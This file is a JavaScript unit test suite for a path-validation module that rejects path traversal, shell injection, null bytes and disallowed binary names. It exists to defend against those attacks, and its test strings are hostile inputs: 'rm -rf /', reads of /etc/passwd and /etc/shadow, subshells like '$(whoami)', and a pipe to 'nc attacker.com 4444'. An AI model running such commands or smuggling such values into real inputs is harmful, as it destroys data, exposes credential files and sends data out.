/**
 * Unit tests for path validation utilities.
 * Run with: node --test bin/lib/pathValidation.test.js
 */

import { describe, it, mock, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';

import {
  containsTraversal,
  containsShellInjection,
  checkExecutable,
  validateBinaryPath,
  validateBeadsPath,
  validateBacklogPath,
} from './pathValidation.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

describe('containsTraversal', () => {
  it('should detect ../ traversal', () => {
    assert.strictEqual(containsTraversal('../file'), true);
    assert.strictEqual(containsTraversal('path/../file'), true);
    assert.strictEqual(containsTraversal('/path/../file'), true);
    assert.strictEqual(containsTraversal('path/..'), true);
  });

  it('should detect ..\\ traversal (Windows)', () => {
    assert.strictEqual(containsTraversal('..\\file'), true);
    assert.strictEqual(containsTraversal('path\\..\\file'), true);
    assert.strictEqual(containsTraversal('C:\\path\\..\\file'), true);
  });

  it('should detect standalone ..', () => {
    assert.strictEqual(containsTraversal('..'), true);
  });

  it('should allow normal paths', () => {
    assert.strictEqual(containsTraversal('/usr/local/bin/bd'), false);
    assert.strictEqual(containsTraversal('/home/user/.local/bin/bd'), false);
    assert.strictEqual(containsTraversal('C:\\Users\\name\\bin\\bd.exe'), false);
  });

  it('should allow paths with dots in filenames', () => {
    assert.strictEqual(containsTraversal('/path/to/file.test.js'), false);
    assert.strictEqual(containsTraversal('/path/.hidden/file'), false);
  });

  it('should handle edge cases', () => {
    assert.strictEqual(containsTraversal(''), false);
    assert.strictEqual(containsTraversal(null), false);
    assert.strictEqual(containsTraversal(undefined), false);
  });
});

describe('containsShellInjection', () => {
  it('should detect command chaining characters', () => {
    assert.strictEqual(containsShellInjection('/bin/bd; rm -rf /'), true);
    assert.strictEqual(containsShellInjection('/bin/bd && malicious'), true);
    assert.strictEqual(containsShellInjection('/bin/bd | cat /etc/passwd'), true);
  });

  it('should detect backticks and subshells', () => {
    assert.strictEqual(containsShellInjection('/bin/`whoami`'), true);
    assert.strictEqual(containsShellInjection('/bin/$(whoami)'), true);
    assert.strictEqual(containsShellInjection('/bin/${PATH}'), true);
  });

  it('should detect quotes', () => {
    assert.strictEqual(containsShellInjection("/bin/bd'"), true);
    assert.strictEqual(containsShellInjection('/bin/bd"'), true);
    // Note: backslash is intentionally allowed for Windows path compatibility
  });

  it('should detect redirections', () => {
    assert.strictEqual(containsShellInjection('/bin/bd > /tmp/out'), true);
    assert.strictEqual(containsShellInjection('/bin/bd < /etc/passwd'), true);
  });

  it('should allow normal paths', () => {
    assert.strictEqual(containsShellInjection('/usr/local/bin/bd'), false);
    assert.strictEqual(containsShellInjection('/home/user/.local/bin/bd'), false);
    assert.strictEqual(containsShellInjection('C:\\Users\\name\\bin\\bd.exe'), false);
    assert.strictEqual(containsShellInjection('/path/with-dashes/and_underscores'), false);
  });

  it('should handle edge cases', () => {
    assert.strictEqual(containsShellInjection(''), false);
    assert.strictEqual(containsShellInjection(null), false);
    assert.strictEqual(containsShellInjection(undefined), false);
  });
});

describe('validateBinaryPath', () => {
  describe('basic validation', () => {
    it('should reject empty paths', () => {
      assert.strictEqual(validateBinaryPath('').valid, false);
      assert.strictEqual(validateBinaryPath('   ').valid, false);
      assert.strictEqual(validateBinaryPath(null).valid, false);
      assert.strictEqual(validateBinaryPath(undefined).valid, false);
    });

    it('should reject paths with traversal', () => {
      const result = validateBinaryPath('../../../etc/passwd', { checkExists: false });
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('traversal'));
    });

    it('should reject paths with shell injection', () => {
      const result = validateBinaryPath('/bin/bd; rm -rf /', { checkExists: false });
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('dangerous'));
    });

    it('should reject paths with null bytes', () => {
      const result = validateBinaryPath('/bin/bd\0malicious', { checkExists: false });
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('null byte'));
    });

    it('should reject excessively long paths', () => {
      const longPath = '/bin/' + 'a'.repeat(5000);
      const result = validateBinaryPath(longPath, { checkExists: false });
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('maximum length'));
    });
  });

  describe('path normalization', () => {
    it('should normalize valid paths', () => {
      // Use a path that doesn't require existence check
      const result = validateBinaryPath('/usr/local/bin/bd', { checkExists: false });
      assert.strictEqual(result.valid, true);
      assert.ok(result.normalizedPath);
    });
  });

  describe('allowedBasenames validation', () => {
    it('should reject paths with non-allowed basenames', () => {
      const result = validateBinaryPath('/usr/bin/malicious', {
        checkExists: false,
        allowedBasenames: ['bd', 'backlog'],
      });
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('not in the allowed list'));
    });

    it('should accept paths with allowed basenames', () => {
      const result = validateBinaryPath('/usr/local/bin/bd', {
        checkExists: false,
        allowedBasenames: ['bd', 'backlog'],
      });
      assert.strictEqual(result.valid, true);
    });

    it('should handle Windows executable extensions', () => {
      const result = validateBinaryPath('C:\\bin\\bd.exe', {
        checkExists: false,
        allowedBasenames: ['bd'],
      });
      assert.strictEqual(result.valid, true);
    });
  });

  describe('existence and executable checks', () => {
    it('should report file not found for non-existent paths', () => {
      const result = validateBinaryPath('/this/path/definitely/does/not/exist/bd');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('not found'));
    });

    it('should validate actual executable files', () => {
      // Test with a file we know exists - the node binary
      const nodePath = process.execPath;
      const result = validateBinaryPath(nodePath, { 
        verifyExecutable: true,
        allowedBasenames: null // Don't restrict basename for this test
      });
      assert.strictEqual(result.valid, true);
    });
  });
});

describe('validateBeadsPath', () => {
  it('should reject non-bd binaries', () => {
    const result = validateBeadsPath('/usr/bin/malicious');
    assert.strictEqual(result.valid, false);
  });

  it('should reject paths with traversal even for bd', () => {
    const result = validateBeadsPath('../../../usr/bin/bd');
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.includes('traversal'));
  });

  it('should accept valid bd path format (if exists check disabled)', () => {
    // This tests the validation logic, not file existence
    // We'd need to mock fs for a complete test
    const result = validateBeadsPath('/nonexistent/path/bd');
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.includes('not found'));
  });
});

describe('validateBacklogPath', () => {
  it('should reject non-backlog binaries', () => {
    const result = validateBacklogPath('/usr/bin/malicious');
    assert.strictEqual(result.valid, false);
  });

  it('should reject paths with shell injection', () => {
    const result = validateBacklogPath('/bin/backlog && rm -rf /');
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.includes('dangerous'));
  });
});

describe('checkExecutable', () => {
  it('should return exists=false for non-existent files', () => {
    const result = checkExecutable('/this/path/does/not/exist');
    assert.strictEqual(result.exists, false);
    assert.strictEqual(result.executable, false);
  });

  it('should detect executable files', () => {
    // Test with the node binary (known to be executable)
    const result = checkExecutable(process.execPath);
    assert.strictEqual(result.exists, true);
    assert.strictEqual(result.executable, true);
  });
});

// Integration-style tests for attack scenarios
describe('attack scenario prevention', () => {
  it('should prevent path traversal to system files', () => {
    const attacks = [
      '../../../etc/passwd',
      '/home/user/../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\cmd.exe',
      '/usr/bin/../../etc/shadow',
    ];

    for (const attack of attacks) {
      const result = validateBinaryPath(attack, { checkExists: false });
      assert.strictEqual(result.valid, false, `Should reject: ${attack}`);
    }
  });

  it('should prevent command injection via path', () => {
    const attacks = [
      '/bin/bd; cat /etc/passwd',
      '/bin/bd && rm -rf /',
      '/bin/bd | nc attacker.com 4444',
      '/bin/bd`whoami`',
      '/bin/bd$(id)',
      '/bin/bd > /tmp/output',
    ];

    for (const attack of attacks) {
      const result = validateBinaryPath(attack, { checkExists: false });
      assert.strictEqual(result.valid, false, `Should reject: ${attack}`);
    }
  });

  it('should prevent null byte injection', () => {
    const attacks = [
      '/bin/bd\0.txt',
      '/bin/\0bd',
      'bd\0malicious',
    ];

    for (const attack of attacks) {
      const result = validateBinaryPath(attack, { checkExists: false });
      assert.strictEqual(result.valid, false, `Should reject path with null byte`);
    }
  });
});
